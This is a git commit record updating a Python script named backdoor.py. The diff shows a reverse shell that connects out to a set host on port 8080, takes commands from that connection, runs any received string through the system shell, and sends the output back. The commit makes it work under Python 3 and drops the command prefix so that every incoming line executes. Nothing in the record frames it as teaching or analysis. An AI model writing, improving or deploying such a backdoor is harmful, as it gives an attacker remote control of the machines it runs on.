7d120b94a6936bb1eec250624fb6b2f532aaa039
Grandhi Naga Srikanth <nagasrikanthgrandhi@gmail.com>
2018-06-03 03:21:00 -0400

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -6,16 +6,14 @@ port=8080
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((ip, port))
 while True:
-    com=s.recv(1024)
+    com=(s.recv(1024).decode())
     if com=="exit":
         s.close()
         break
     elif com.startswith("execute="):
         os.system(com[8:])
-    elif com.startswith("os="):
-	    proc = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    else:
+        proc = subprocess.Popen(com, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         op= proc.stdout.read()
         op+=proc.stderr.read()
-        s.send(op)
-    else:
-        pass
+        s.send(op.encode())
